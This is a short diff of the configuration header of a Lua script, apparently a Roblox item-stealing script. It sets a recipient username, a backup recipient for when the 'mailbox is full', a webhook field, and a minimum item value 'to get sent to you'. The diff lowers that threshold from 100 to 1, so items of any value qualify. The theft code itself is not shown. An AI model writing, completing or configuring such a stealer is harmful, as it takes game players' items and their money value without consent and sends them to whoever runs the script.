@@ -1,7 +1,7 @@
 Username = "YTZ_oTzieWalker"
 Username2 = "" -- stuff will get sent to this user if first user's mailbox is full
 webhook = ""
-min_rap = 100 -- minimum rap of each item you want to get sent to you. 1 mil by default
+min_rap = 1 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
